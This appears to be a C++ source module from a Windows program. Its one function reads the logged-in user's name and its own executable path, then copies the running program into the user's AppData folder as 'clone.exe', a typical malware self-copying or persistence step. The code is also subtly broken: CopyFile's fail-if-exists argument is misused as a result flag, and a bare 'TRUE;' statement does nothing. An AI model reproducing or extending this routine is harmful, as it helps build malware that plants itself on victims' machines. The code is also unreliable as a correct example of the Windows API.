
#include "pch.h"
#include "CP.h"
#include <windows.h>
#include <Lmcons.h>


void CP::execute(){

	string name;
	TCHAR tcname[UNLEN + 1];
	DWORD length = UNLEN + 1;
	GetUserName(tcname, &length);
	name = tcname;

	char filename[MAX_PATH];
	DWORD size = GetModuleFileNameA(NULL,filename, MAX_PATH);
	string path = this->base + name + this->appData + "\\clone.exe";
	//this->base.append(name);
	BOOL response = 0;
	CopyFile(filename,path.c_str(),response);
	if (response) {
		TRUE;
	}
}